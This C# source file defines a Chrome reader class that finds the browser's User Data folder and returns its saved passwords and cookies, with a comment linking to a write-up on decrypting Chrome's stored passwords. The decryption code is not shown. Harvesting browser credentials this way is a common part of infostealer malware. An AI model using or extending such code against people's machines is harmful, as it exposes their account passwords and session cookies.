using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Collections.Generic;

namespace dao
{
    /// <summary>
    /// http://raidersec.blogspot.com/2013/06/how-browsers-store-your-passwords-and.html#chrome_decryption
    /// </summary>
    class Chrome : IReader
    {
        public string BrowserName { get { return "Chrome"; } }

        private readonly ChromeModel Model;

        public Chrome()
        {
            string LOCAL_PATH = ChromeModel.GetAppDataLocalPath();
            string userDataPath = Path.Combine(LOCAL_PATH, @"Google\Chrome\User Data");
            Model = new ChromeModel(userDataPath);
        }

        public IEnumerable<PassModel> Passwords(string host = null)
        {
            return Model.ReadPassword(host);
        }

        public IEnumerable<Cookie> Cookies(string host = null)
        {
            return Model.ReadCookie(host);
        }
    }



}
